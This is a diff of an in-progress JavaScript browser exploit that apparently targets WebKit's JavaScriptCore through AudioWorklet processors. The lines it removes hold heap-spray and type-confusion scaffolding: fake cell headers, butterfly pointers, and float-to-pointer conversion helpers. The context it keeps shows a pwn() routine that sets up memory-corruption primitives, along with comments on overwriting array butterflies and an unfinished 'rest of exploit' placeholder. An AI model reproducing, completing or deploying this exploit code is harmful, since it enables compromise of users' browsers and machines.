@@ -525,83 +525,7 @@ function gc() {
         }
 }
 
-let data_view = new DataView(new ArrayBuffer(8));
-var floatAsQword = float => {
-    data_view.setFloat64(0, float, true);
-    var low = data_view.getUint32(0, true);
-    var high = data_view.getUint32(4, true);
-    return low + (high * 0x100000000);
-}
-var qwordAsTagged = qword =>{
-    return qwordAsFloat( qword- 0x02000000000000);
-}
-var qwordAsFloat = qword => {
-    data_view.setUint32(0, qword%0x100000000, true);
-    data_view.setUint32(4, qword/0x100000000, true);
-    //data_view.setBigUint64(0, qword);
-    return data_view.getFloat64(0, true);
-}
-function change_container(header, arr){
-    try{}
-    catch{}
-    for(var i = 0; i < 0x100000; i++){
-        ds[i].cellHeader = header;
-        ds[i].butterfly = arr;
-    }
-}
-const MY_OBJECT_OFFSET = 0x14fb0;
-//MakeJitCompiledFunction();
-//MakeJitCompiledFunction();
-
-
-var a= new Array(10);
-for(var i = 0; i < 0x1000; i++)
-  a[i]= Array(0x40).fill(0.0);
-var b = Array(0x40).fill(0.0);
-var c = Array(0x40).fill(0.0);
-var ds = new Array(0x100000);
-
-let noCoW =13.37
-let pad = new Array(noCoW, 2.2, {}, 13.37);
-let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-
-var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8); //victim
-
-var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);
-
-
-
-var victim = [noCoW, 14.47, 15.57];
-victim['prop'] = 13.37;
-victim['prop_1'] = 13.37;
-let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-
-//var gcPreventer = [];
-var structure_id = 0;
-c[0] = 1.1;
-var fuck = undefined;
-var fuck2 = undefined;
-var driver = undefined;
-var stage = "leak"
-var jscell_header = undefined;
-var evil_arr_butterfly = undefined;
-var expected_ptr = undefined;
-eval(`
-for(var i = 0; i < 0x10000; i++){
-    var tag = qwordAsTagged(0x0108230700001000)
-    ds[i] = {
-        cellHeader1: tag,
-        butterfly1: evil_arr,
-        cellHeader2: tag,
-        butterfly2: evil_arr,
-        cellHeader3: tag,
-        butterfly3: evil_arr
-    };
-}
-`);
-b.process = (inputs, outputs, parameters)=>{
+process = () => {
           const kBoxedDoubleOffset = 0x0002000000000000n;
           function boxDouble(d) {
             return d + kBoxedDoubleOffset;
@@ -724,7 +648,6 @@ b.process = (inputs, outputs, parameters)=>{
           }
 
           function pwn() {
-            try {
               setupPrimitives();
 
               // ensure we can survive GC
@@ -733,10 +656,6 @@ b.process = (inputs, outputs, parameters)=>{
               // TODO: rest of exploit goes here
 
               fuck.port.postMessage("done!");
-            } catch(e) { // send exception strings to main thread (for debugging)
-              fuck.port.postMessage("Exception!!");
-              fuck.port.postMessage(e.toString());
-            }
           }
 
           registerProcessor("OrigineWorklet", class {
@@ -753,10 +672,6 @@ b.process = (inputs, outputs, parameters)=>{
               // overwrite a1's butterfly with a fastMalloc pointer
               return {fill: 1, a: a0};
             }
-            process (inputs, outputs, parameters) {
-        
-        return false;
-    }
           });
           registerProcessor("OrigineWorklet2", class {
             constructor() {
@@ -764,51 +679,6 @@ b.process = (inputs, outputs, parameters)=>{
               // overwrite b1's butterfly with a fastMalloc pointer
               return {fill: 1, b: b0};
             }
-            process (inputs, outputs, parameters) {
-        
-        return false;
-    }
           });
+    process();
 
-/*class OrigineWorklet extends AudioWorkletProcessor {
-    constructor(){
-        super();
-        //var fuck2 = new AudioWorkletProcessor();
-        return b;
-    }
-    static get parameterDescriptors() {
-        return []
-    }
-    process (inputs, outputs, parameters) {
-        
-        return false;
-    }
-}
-class OrigineWorklet2 extends AudioWorkletProcessor {
-    constructor(){
-        super();
-        //console.log(c);
-        /*this.port.onmessage = (e)=>{
-            alert(e);
-        }/
-        
-        fuck = this;
-        //fuck.port.postMessage(c);
-        return this;
-    }
-    static get parameterDescriptors() {
-        return [{
-            name: 'param2',
-            defaultValue: 0.1337
-        }];
-    }
-    process (inputs, outputs, parameters) {
-        //
-        //
-        //this.port.postMessage(c);
-        return false;
-    }
-}*/
-
-registerProcessor('OrigineWorklet', OrigineWorklet);
-registerProcessor('OrigineWorklet2', OrigineWorklet2);
